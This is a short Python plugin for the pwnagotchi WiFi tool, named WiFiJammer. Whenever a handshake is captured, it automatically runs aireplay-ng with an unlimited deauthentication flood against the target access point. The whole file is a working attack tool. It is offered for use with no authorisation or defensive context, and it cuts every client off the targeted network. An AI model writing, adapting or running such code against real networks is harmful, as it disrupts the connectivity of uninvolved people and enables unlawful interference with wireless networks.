import subprocess
from pwnagotchi.plugins import BasePlugin

class WiFiJammer(BasePlugin):
    __author__ = 'Deus Dust'
    __version__ = '1.0.0'
    __license__ = 'MIT'

    def __init__(self):
        super(WiFiJammer, self).__init__()

    def jam_wifi(self, target_bssid, interface="wlan0"):
        try:
            subprocess.run(["aireplay-ng", "--deauth", "0", "-a", target_bssid, interface], check=True)
            self.log.info(f"WiFi jamming initiated for {target_bssid}")
        except subprocess.CalledProcessError as e:
            self.log.error(f"Failed to initiate WiFi jamming: {e}")

    def on_loaded(self):
        self.log.info("WiFi Jammer Plugin loaded")

    def on_handshake(self, agent, filename, access_point):
        target_bssid = access_point.bssid
        self.jam_wifi(target_bssid)

    def on_unload(self):
        self.log.info("WiFi Jammer Plugin unloaded")

# Instantiate the plugin
plugin = WiFiJammer()
